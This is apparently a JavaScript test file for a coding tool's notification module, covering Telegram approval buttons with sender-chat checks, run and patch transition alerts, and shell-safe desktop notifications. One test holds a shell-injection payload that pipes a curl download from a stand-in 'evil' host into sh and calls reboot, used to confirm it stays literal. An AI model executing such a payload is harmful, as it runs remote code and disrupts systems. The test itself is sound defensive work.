// Attention routing: config precedence, transition detection (news vs
// history), Telegram approval round-trip incl. sender verification, shell
// safety of desktop delivery, and the never-break-the-TUI failure paths.
import { test } from "node:test";
import assert from "node:assert/strict";
import {
  approvalCallbackData,
  callbackFromConfiguredChat,
  createRoomNotifier,
  detectRoomTransitions,
  escapeAppleScript,
  formatApprovalMessage,
  loadNotifyConfig,
  parseApprovalCallback,
  RoomNotifier,
  roomSnapshot,
  sendDesktopNotification,
  TelegramChannel,
} from "../dist/notify.js";

const context = {
  roomName: "room 2",
  agentName: (id) => (id === "agent-1" ? "@builder" : "agent"),
};

/** Deterministic wait: resolves when the fetch mock records a call for `method`. */
function callRecorder() {
  const calls = [];
  const waiters = [];
  return {
    calls,
    record(entry) {
      calls.push(entry);
      for (const [index, waiter] of [...waiters.entries()].reverse()) {
        if (waiter.method === entry.method) {
          waiters.splice(index, 1);
          waiter.resolve(entry);
        }
      }
    },
    waitFor(method) {
      const existing = calls.find((call) => call.method === method);
      if (existing) return Promise.resolve(existing);
      return new Promise((resolve) => waiters.push({ method, resolve }));
    },
  };
}

test("loadNotifyConfig: env overrides file, CO_OD_NOTIFY=off kills everything", () => {
  const readFile = () => JSON.stringify({ desktop: false, telegram: { botToken: "file-token", chatId: "file-chat" } });
  const fromFile = loadNotifyConfig({}, readFile);
  assert.equal(fromFile.desktop, false);
  assert.equal(fromFile.telegram.botToken, "file-token");

  const fromEnv = loadNotifyConfig(
    { CO_OD_TELEGRAM_BOT_TOKEN: " env-token ", CO_OD_TELEGRAM_CHAT_ID: "env-chat" },
    readFile,
  );
  assert.equal(fromEnv.telegram.botToken, "env-token");

  assert.equal(loadNotifyConfig({ CO_OD_NOTIFY: "off" }, readFile), null);

  const noFile = loadNotifyConfig({}, () => { throw new Error("ENOENT"); });
  assert.equal(noFile.desktop, true);
  assert.equal(noFile.telegram, undefined);

  // partial telegram config never half-configures
  const partial = loadNotifyConfig({}, () => JSON.stringify({ telegram: { botToken: "only-token" } }));
  assert.equal(partial.telegram, undefined);
});

test("createRoomNotifier: null when killed or nothing can deliver", () => {
  process.env.CO_OD_NOTIFY = "off";
  try {
    assert.equal(createRoomNotifier(process.env), null);
  } finally {
    delete process.env.CO_OD_NOTIFY;
  }
});

test("detectRoomTransitions: terminal transitions are news, history is silent", () => {
  const previous = roomSnapshot(
    [
      { _id: "r1", status: "running", goal: "fix the websocket test", agent_id: "agent-1" },
      { _id: "r2", status: "running", goal: "update deps" },
    ],
    [],
  );
  const events = detectRoomTransitions(previous, {
    runs: [
      { _id: "r1", status: "succeeded", goal: "fix the websocket test", agent_id: "agent-1" },
      { _id: "r2", status: "failed", goal: "update deps" },
      // first sighting, already terminal — history, not news
      { _id: "r3", status: "failed", goal: "old failure" },
    ],
    patches: [],
  }, context);

  assert.equal(events.length, 2);
  assert.equal(events[0].kind, "run-succeeded");
  assert.match(events[0].title, /room 2 · @builder/);
  assert.equal(events[1].kind, "run-failed");
  assert.match(events[1].body, /\/retry/);
});

test("detectRoomTransitions: patch news requires prior patch knowledge", () => {
  // previous snapshot taken before patches loaded (undefined): NO patch news,
  // even though the next payload has proposed patches — that's the startup
  // burst the guard exists to prevent.
  const beforeLoad = roomSnapshot([{ _id: "r1", status: "queued" }], undefined);
  assert.equal(beforeLoad.hasPatchData, false);
  const burst = detectRoomTransitions(beforeLoad, {
    runs: [{ _id: "r1", status: "running" }],
    patches: [{ _id: "p1", status: "proposed" }, { _id: "p2", status: "proposed" }],
  }, context);
  assert.equal(burst.length, 0, "loading patches must not read as news");

  // with real prior knowledge, only the genuinely new proposed patch fires
  const loaded = roomSnapshot([], [{ _id: "p1", status: "proposed" }, { _id: "p0", status: "accepted" }]);
  const events = detectRoomTransitions(loaded, {
    runs: [],
    patches: [
      { _id: "p1", status: "proposed", path: "already known" },
      { _id: "p2", status: "proposed", path: "src/auth.ts" },
    ],
  }, context);
  assert.equal(events.length, 1);
  assert.match(events[0].body, /src\/auth\.ts/);
});

test("approval callback data round-trips and rejects junk", () => {
  const data = approvalCallbackData("ap-123", "approve");
  assert.deepEqual(parseApprovalCallback(data), { approvalId: "ap-123", decision: "approve" });
  assert.equal(parseApprovalCallback("apr|x|maybe"), null);
  assert.equal(parseApprovalCallback(undefined), null);
});

test("callbackFromConfiguredChat: only the configured chat is trusted", () => {
  const tap = (chatId) => ({ update_id: 1, callback_query: { id: "cb", data: "apr|a|approve", message: { chat: { id: chatId } } } });
  assert.equal(callbackFromConfiguredChat(tap(42), "42"), true);
  assert.equal(callbackFromConfiguredChat(tap("42"), "42"), true);
  assert.equal(callbackFromConfiguredChat(tap(-100123), "42"), false, "group chat is not the configured chat");
  assert.equal(callbackFromConfiguredChat({ update_id: 1, callback_query: { id: "cb" } }, "42"), false, "missing chat is untrusted");
});

test("formatApprovalMessage names the room, agent, and target", () => {
  const text = formatApprovalMessage(
    { approvalId: "ap-1", kind: "shell", command: "npm test", cwd: "/work" },
    { roomName: "room 2", agentName: "@builder" },
  );
  assert.match(text, /shell command approval — room 2 · @builder/);
  assert.match(text, /npm test/);
});

test("desktop delivery never touches a shell — payloads stay literal argv", () => {
  const seen = [];
  const execFileImpl = (file, args) => seen.push({ file, args });
  const payload = "$(curl evil | sh); `reboot` '; touch /tmp/pwned";

  sendDesktopNotification("title", payload, "linux", execFileImpl);
  assert.equal(seen[0].file, "notify-send");
  assert.equal(seen[0].args[1], payload, "linux body is a literal argv element");

  sendDesktopNotification('ti"tle', payload, "darwin", execFileImpl);
  assert.equal(seen[1].file, "osascript");
  assert.equal(seen[1].args[0], "-e");
  assert.match(seen[1].args[1], /display notification/);
  assert.ok(seen[1].args[1].includes('\\"'), "double quotes escaped inside the AppleScript literal");

  sendDesktopNotification("t", "b", "win32", execFileImpl);
  assert.equal(seen.length, 2, "unsupported platforms are a no-op");
});

test("escapeAppleScript neutralizes quotes and backslashes", () => {
  assert.equal(escapeAppleScript('say "hi" \\ done'), 'say \\"hi\\" \\\\ done');
});

test("TelegramChannel: approval buttons, trusted-chat polling, offset advance", async () => {
  const recorder = callRecorder();
  let pollCount = 0;
  const fetchImpl = async (url, init) => {
    const method = String(url).split("/").pop();
    const payload = JSON.parse(init.body);
    recorder.record({ method, payload });
    if (method === "getUpdates") {
      pollCount += 1;
      if (pollCount === 1) {
        return new Response(JSON.stringify({
          ok: true,
          result: [
            // foreign-chat tap first: must be acknowledged but never resolve
            { update_id: 7, callback_query: { id: "cb-evil", data: "apr|ap-1|approve", message: { chat: { id: -999 } } } },
            { update_id: 8, callback_query: { id: "cb-ok", data: "apr|ap-1|approve", message: { chat: { id: "c" } } } },
          ],
        }));
      }
      await new Promise((resolve) => setTimeout(resolve, 50));
      return new Response(JSON.stringify({ ok: true, result: [] }));
    }
    return new Response(JSON.stringify({ ok: true, result: { message_id: 42 } }));
  };

  const channel = new TelegramChannel({ botToken: "t", chatId: "c" }, fetchImpl);
  const messageId = await channel.sendApproval(
    { approvalId: "approval-agent-xyz-12345-1781251756000", kind: "shell", command: "rm -rf build" },
    { roomName: "room 2", agentName: "@builder" },
    "ap-1",
  );
  assert.equal(messageId, 42);
  const send = recorder.calls.find((call) => call.method === "sendMessage");
  // the SHORT token rides in callback_data (Telegram caps it at 64 bytes),
  // never the raw bridge approvalId
  assert.equal(send.payload.reply_markup.inline_keyboard[0][0].callback_data, "apr|ap-1|approve");
  assert.ok(send.payload.reply_markup.inline_keyboard[0][0].callback_data.length <= 64);

  const decisions = [];
  channel.startPolling((callback) => decisions.push(callback));
  // two answerCallbackQuery calls: the rejection ack and the trusted ack
  await recorder.waitFor("answerCallbackQuery");
  await new Promise((resolve) => setImmediate(resolve));
  channel.stopPolling();

  assert.deepEqual(decisions, [{ approvalId: "ap-1", decision: "approve" }], "only the configured chat resolves");
  const acks = recorder.calls.filter((call) => call.method === "answerCallbackQuery");
  assert.equal(acks.length, 2);
  assert.match(acks[0].payload.text, /Not authorized/);
  const lastPoll = recorder.calls.filter((call) => call.method === "getUpdates").at(-1);
  assert.ok(lastPoll.payload.offset >= 9, "consumed updates are skipped on the next poll");
});

test("Telegram failures never throw, and approval-delivery failure is surfaced", async () => {
  const problems = [];
  const fetchImpl = async (url) => {
    const method = String(url).split("/").pop();
    if (method === "sendMessage") return new Response("nope", { status: 401 });
    throw new Error("offline");
  };
  const notifier = new RoomNotifier({ desktop: false, telegram: { botToken: "t", chatId: "c" } }, fetchImpl);
  notifier.setProblemHandler((problem) => problems.push(problem));

  notifier.deliver("title", "body"); // must not throw or reject unhandled
  notifier.approvalRequested({ approvalId: "ap-1", kind: "shell", command: "ls" }, { roomName: "room 2", agentName: "@builder" });
  await new Promise((resolve) => setTimeout(resolve, 10));
  notifier.close();

  assert.ok(problems.some((problem) => /sendMessage failed \(401\)/.test(problem)));
  assert.ok(problems.some((problem) => /approve at the terminal/.test(problem)), "user learns the buttons never arrived");
});

test("RoomNotifier: first observation silent, dedupe, room switch resets knowledge", async () => {
  const recorder = callRecorder();
  const fetchImpl = async (url, init) => {
    const method = String(url).split("/").pop();
    recorder.record({ method, payload: JSON.parse(init.body ?? "{}") });
    if (method === "getUpdates") {
      await new Promise((resolve) => setTimeout(resolve, 30));
      return new Response(JSON.stringify({ ok: true, result: [] }));
    }
    return new Response(JSON.stringify({ ok: true, result: { message_id: 9 } }));
  };
  const notifier = new RoomNotifier({ desktop: false, telegram: { botToken: "t", chatId: "c" } }, fetchImpl);
  const ctx = () => context;

  const runsA = [{ _id: "r1", status: "running", goal: "task one", agent_id: "agent-1" }];
  notifier.observe(runsA, [], "room-a", ctx);
  assert.equal(recorder.calls.filter((call) => call.method === "sendMessage").length, 0, "history is silent");

  const runsB = [{ _id: "r1", status: "succeeded", goal: "task one", agent_id: "agent-1" }];
  notifier.observe(runsB, [], "room-a", ctx);
  notifier.observe(runsB, [], "room-a", ctx); // same refs — no rework, no duplicates
  await recorder.waitFor("sendMessage");
  const messages = recorder.calls.filter((call) => call.method === "sendMessage");
  assert.equal(messages.length, 1);
  assert.match(messages[0].payload.text, /done — room 2 · @builder/);

  // switching rooms: the new room's settled history must not fire
  const otherRoomRuns = [{ _id: "x1", status: "succeeded", goal: "other room history" }];
  notifier.observe(otherRoomRuns, [], "room-b", ctx);
  const after = recorder.calls.filter((call) => call.method === "sendMessage");
  assert.equal(after.length, 1, "room switch resets the snapshot instead of diffing across rooms");
  notifier.close();
});

test("RoomNotifier translates the short tap token back to the real approvalId", async () => {
  const recorder = callRecorder();
  let sentCallbackData = null;
  const fetchImpl = async (url, init) => {
    const method = String(url).split("/").pop();
    const payload = JSON.parse(init.body ?? "{}");
    recorder.record({ method, payload });
    if (method === "sendMessage" && payload.reply_markup) {
      sentCallbackData = payload.reply_markup.inline_keyboard[0][0].callback_data;
    }
    if (method === "getUpdates") {
      if (sentCallbackData) {
        const data = sentCallbackData;
        sentCallbackData = null;
        return new Response(JSON.stringify({
          ok: true,
          result: [{ update_id: 1, callback_query: { id: "cb", data, message: { chat: { id: "c" } } } }],
        }));
      }
      await new Promise((resolve) => setTimeout(resolve, 30));
      return new Response(JSON.stringify({ ok: true, result: [] }));
    }
    return new Response(JSON.stringify({ ok: true, result: { message_id: 5 } }));
  };
  const notifier = new RoomNotifier({ desktop: false, telegram: { botToken: "t", chatId: "c" } }, fetchImpl);
  const longId = "approval-agent-abcdef0123456789-987654-1781251756000-extra-long";
  const decision = await new Promise((resolve) => {
    notifier.setRemoteDecisionHandler(resolve);
    notifier.approvalRequested({ approvalId: longId, kind: "shell", command: "ls" }, { roomName: "room 2", agentName: "@builder" });
  });
  notifier.close();
  assert.deepEqual(decision, { approvalId: longId, decision: "approve" });
});

test("RoomNotifier approval lifecycle: poll only while pending, resolution edits the message", async () => {
  const recorder = callRecorder();
  const fetchImpl = async (url, init) => {
    const method = String(url).split("/").pop();
    recorder.record({ method, payload: JSON.parse(init.body ?? "{}") });
    if (method === "getUpdates") {
      await new Promise((resolve) => setTimeout(resolve, 30));
      return new Response(JSON.stringify({ ok: true, result: [] }));
    }
    return new Response(JSON.stringify({ ok: true, result: { message_id: 9 } }));
  };
  const notifier = new RoomNotifier({ desktop: false, telegram: { botToken: "t", chatId: "c" } }, fetchImpl);

  notifier.approvalRequested({ approvalId: "ap-9", kind: "shell", command: "ls" }, { roomName: "room 2", agentName: "@builder" });
  assert.equal(notifier.hasPendingApproval("ap-9"), true);
  await recorder.waitFor("sendMessage"); // approval message delivered…
  // …and let sendApproval's .then() record the messageId before resolving
  await new Promise((resolve) => setImmediate(resolve));
  await new Promise((resolve) => setImmediate(resolve));
  notifier.approvalResolved("ap-9", "deny", "tui");
  assert.equal(notifier.hasPendingApproval("ap-9"), false);
  const edit = await recorder.waitFor("editMessageText");
  assert.match(edit.payload.text, /denied \(tui\)/);
  notifier.close();
});
